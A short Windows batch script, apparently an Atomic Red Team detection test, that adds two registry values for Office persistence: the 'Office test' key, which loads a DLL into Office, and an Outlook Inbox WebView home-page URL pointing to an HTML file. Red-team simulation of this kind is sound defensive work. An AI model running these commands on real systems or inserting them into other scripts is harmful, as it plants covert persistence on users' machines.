@echo Off
cmd.exe /C reg add "HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf" /t REG_SZ /d "C:\Path\AtomicRedTeam.dll"
cmd.exe /C reg.exe add HKCU\Software\Microsoft\Office\16.0\Outlook\WebView\Inbox /v URL /t REG_SZ /d file://d43bfc_T1137.004.html /f 